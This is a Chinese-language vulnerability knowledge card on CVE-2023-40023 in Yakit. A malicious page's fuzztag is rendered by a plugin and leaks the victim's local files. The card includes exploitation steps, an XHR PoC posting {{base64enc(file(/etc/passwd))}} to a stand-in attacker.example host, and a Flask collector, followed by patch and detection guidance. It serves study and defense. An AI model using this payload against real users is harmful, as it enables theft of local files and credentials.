---
id: tools-yakit-fuzztag-file-tag-local-file-exfiltration
title: Yakit fuzztag 注入本地文件读取外带（CVE-2023-40023）：恶意网页的 {{base64enc(file(...))}} 被插件渲染后随镜像请求发出
type: scenario
domain: tools
path: tools
technique: yakit-plugin-fuzztag-file-tag-lfi-exfiltration
tags:
- yakit
- yaklang
- security-tool
- fuzztag
- lfi
- file-read
- client-side
- plugin
- mitm
- exfiltration
- cve-2023-40023
cve:
- CVE-2023-40023
severity: high
confidence: high
affected_versions: < 1.2.4-sp1
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V539
  verified_at: '2026-11-11T18:53:30+08:00'
  notes: 已对照原文 content.md 与全部 13 张截图逐项核对：fuzztag 列表（图01）、yak-engine 目录与 v1.3.0-sp6（图02-03）、回退 v1.2.4（图05-06）、GitHub 公告 affected < 1.2.4-sp1 / patched 1.2.4-sp2（图04）、启用基础 XSS 检测插件（图07）、test 文件 say_hi（图08）、未启用插件时请求体保留 file={{base64enc(file(C://test))}}（图10）、启用后变为 file=c2FsX2hp（图09/11）、AddFuzzTagToGlobal 注册 file 标签（图12）、_httpPool 内 QuickMutateWithCallbackEx2（图13）均一致；修复描述与原文 FuzzFileOptions/config.ForceFuzzfile 一致。affected_versions 取公告的 < 1.2.4-sp1（公告 patched 栏为 1.2.4-sp2、正文补丁文字写 1.2.4-sp1，卡内已注明）。验证中修正：file 标签别名按图12改为标签名 file、别名 fileline/file:lines。dedup 为 new，候选为其他产品 LFI/文件读取及 yakit 正常用法卡，无同 CVE/同 sink。未验证点：PoC 未本机复跑（需 Yakit 客户端环境）；CVE 归属以原文标题与公告页为准。
url: /docs/tools/tools-yakit-fuzztag-file-tag-local-file-exfiltration/
draft: false
kb_aliases:
- Yakit CVE-2023-40023
- Yakit 本地文件读取
- Yak Engine LFI
- fuzztag file 标签滥用
- Yakit 插件解析 fuzztag
- '{{base64enc(file(...))}}'
---

## 一句话结论

Yakit/Yak Engine 1.2.4-sp1 之前，MITM 代理把流量镜像给插件时，插件管道会用 fuzz 库解析请求中的 fuzztag；攻击者在恶意网页里放一个 `file={{base64enc(file(/etc/passwd))}}` 的 POST，受害者用 Yakit 代理浏览且启用了处理流量的插件时，`file` 标签会在受害者本机读取任意文件、base64 编码后替换进请求体发给攻击者，造成本地文件读取外带（CVE-2023-40023）。

## 原理

- **fuzztag 语法**：Yakit 的 fuzz 功能使用 `{{tagname(arg)}}` 形式的标签，例如 `{{randint(1,100)}}`、`{{base64enc(abc)}}`、`{{file(/tmp/1.txt)}}`。`file` 标签通过 `AddFuzzTagToGlobal` 注册为全局处理器（标签名 `file`，别名 `fileline`/`file:lines`），实现用 `utils.FileLineReader` 逐行读取本地文件并把内容拼成返回值；`base64enc` 再把内容编码成单行，便于塞进表单/请求体。
- **解析发生在插件侧而非代理默认路径**：Yakit 默认不会解析经过 MITM PROXY 的流量中的 fuzztag；但当启用了会处理镜像流量的插件（原文用「基础 XSS 检测」，其他插件亦可）时，插件处理流程在 `_httpPool` 中调用 `QuickMutateWithCallbackEx2(reqRaw, ...)`，对整段请求原文做 fuzz 解析，所有已注册标签（包括全局 `file`）都会被求值。
- **攻击路径**：恶意页面用 XHR 向攻击者控制的地址发送 `file={{base64enc(file(C://test))}}`。该请求经浏览器代理进入 Yakit MITM；插件解析请求体时把 `{{base64enc(file(C://test))}}` 替换成目标文件内容的 Base64（原文示例 test 文件内容 `say_hi` → 请求体变为 `file=c2FsX2hp`），随后代理把替换后的请求转发给攻击者服务器，文件内容即被外带。
- **无插件不成立**：原文对比截图显示，未启用插件时请求体保持原始字面量 `file={{base64enc(file(C://test))}}` 并被原样转发；启用插件后请求体才被替换为文件内容。
- **修复思路**：官方在 1.2.4-sp1 去掉了 `QuickMutateWithCallbackEx2` 调用，新增 `FuzzFileOptions`，并用 `config.ForceFuzzfile` 控制是否注册 file 系标签——默认不再对镜像流量解析 file 标签。

## 触发条件

- Yakit / Yak Engine 版本低于 1.2.4-sp1（原文漏洞环境回退到 v1.2.4；GitHub 公告标记受影响 `< 1.2.4-sp1`，补丁 1.2.4-sp1/1.2.4-sp2）。
- 受害者使用 Yakit 的 MITM 代理浏览/扫描攻击者可控页面（或任何会携带 fuzztag 的流量），且浏览器/扫描流量确实经过 Yakit 代理。
- 启用了会处理镜像流量的 Yakit 插件（如「基础 XSS 检测」等）；默认不解析 fuzztag，无插件时不成立。
- 攻击者能部署恶意页面并接收 POST 请求（如 Flask 站点）；目标文件为 Yak 进程可读。

## 利用步骤

1. 攻击者部署恶意页面，页面脚本向攻击者服务器发送请求，body 中嵌入 `{{base64enc(file(<目标文件>))}}`；文件路径用标签分隔可一次读多个文件（`|` 分隔）。
2. 诱导/等待受害者用启用 Yakit MITM 代理的浏览器访问该页面（或让 Yakit 扫描该站点）。
3. Yakit 把请求镜像给已启用插件；插件 fuzz 解析时执行 `file` 标签，读取受害者本机文件并用 `base64enc` 编码，写回请求体。
4. 代理把改写后的请求转发到攻击者服务器；攻击者在服务端日志/请求体中获得 Base64 内容，解码即得文件。
5. 原文验证：本机 `C://test` 内容 `say_hi`，攻击页面收到的请求体为 `file=c2FsX2hp`。

## PoC

恶意页面（原文 Flask + 模板，核心 HTML/JS）：

```html
<script>
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "http://attacker.example/collect");
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send(`file={{base64enc(file(/etc/passwd))}}`);
</script>
```

接收集（最小 Flask）：

```python
from flask import Flask, request
app = Flask(__name__)

@app.route('/collect', methods=['POST'])
def collect():
    print(request.form.to_dict())   # {'file': '<base64 文件内容>'}
    return 'ok'

app.run(host='0.0.0.0', port=5000)
```

- 受害者侧条件：Yakit < 1.2.4-sp1，MITM 代理开启，浏览器代理指向 Yakit，且启用任一处理流量的插件（如「基础 XSS 检测」）。
- Windows 路径写作 `C://test`（原文写法）或将目标换成 `C:/Windows/win.ini` 等；多个文件用 `|` 分隔。
- 原文还给出 `{{file(...)}}` 不套 `base64enc` 的变体：会按行返回文件内容，但可能破坏表单编码，推荐 `base64enc`。

## 变体与关联

- 变体：除 `file` 外，其他全局 fuzztag 也会被插件求值；若存在可执行命令/发起网络请求的标签，危害可超出文件读取（GitHub 公告提到可能进一步导致 RCE，但原文只验证了文件读取）。
- 变体：触发不限于 XSS 插件，任何会对镜像请求调用 fuzz 解析的插件都可作为载体；原文明确「打开其他的插件也可以」。
- 关联：[[yak-exe-c2-av-bypass-360-huorong]]（同为 yak 生态工具的滥用，但那张卡是拿 yak.exe 当 C2/代理免杀，不是本漏洞）。
- 关联：[[tools-burp-mitmproxy-dual-chain-aes-cbc-yakit-hotload-phone-bruteforce]]（Yakit/Burp 流量处理链的正常用法，可对照理解 MITM 镜像与插件处理位置）。

## 检测与防御

- 防御：升级到 1.2.4-sp1 及以上（官方补丁移除 `QuickMutateWithCallbackEx2` 的镜像流量 fuzz 解析，并用 `config.ForceFuzzfile` 控制 file 标签注册）。
- 防御：不要用带流量处理插件的 Yakit 代理浏览不可信站点；不需要时关闭 MITM 插件或插件自动处理；以低权限运行 Yak 引擎。
- 检测：在 MITM/插件日志与代理流量中搜索 `{{`、`file(`、`base64enc(` 等 fuzztag 特征；关注请求体在插件处理前后发生替换、且替换内容为高熵 Base64 的流量。
- 检测：关注 Yak 进程异常读取敏感文件（凭据、密钥、浏览器数据）后向外部地址发送 POST 的出站行为。
